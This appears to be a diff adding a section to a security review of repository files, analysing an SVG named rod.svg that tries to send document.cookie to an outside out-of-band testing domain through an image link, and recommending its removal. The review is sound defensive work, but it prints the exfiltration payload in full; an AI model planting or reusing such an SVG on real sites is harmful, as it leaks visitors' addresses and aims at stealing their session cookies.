@@ -55,4 +55,23 @@ This document provides a review of `test.html` and `ssrf.svg` in the repository.
 - Sanitize SVG files before processing them server-side to remove potentially harmful tags like `<image>`, `<script>`, or `<iframe>`.
 
 ## Rendering Results
-The `test.html` file renders a simple password input and a button. The `ssrf.svg` file renders a broken image icon because the external resource is unavailable.
+The `test.html` file renders a simple password input and a button. The `ssrf.svg` and `rod.svg` files render a broken image icon because the external resource is unavailable.
+
+## 3. `rod.svg`: Attempted Cookie Stealing
+
+### Code Analysis
+```xml
+<svg width="200" height="200"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="https://njwfvuseswxqaylzuqhypvn84znx1dsnq.oast.fun/image.jpg?cookie='+document.cookie" height="200" width="200"/>
+</svg>
+```
+
+### Findings
+- **Malicious Intent**: This file attempts to exfiltrate `document.cookie` by appending it as a query parameter to an external image request.
+- **Ineffectiveness**: In standard SVG rendering within an `<img>` tag or as a direct file, JavaScript expressions like `document.cookie` are not evaluated within the `xlink:href` attribute. It would be treated as a literal string. However, it demonstrates the attacker's intent to steal sensitive session information.
+- **Privacy Risk**: Similar to `ssrf.svg`, it still leaks the user's IP address and potentially other metadata to the external OAST domain when the browser attempts to fetch the image.
+
+### Recommendation
+- Remove this file.
+- Educate developers on the risks of SVG and how they can be used for data exfiltration.
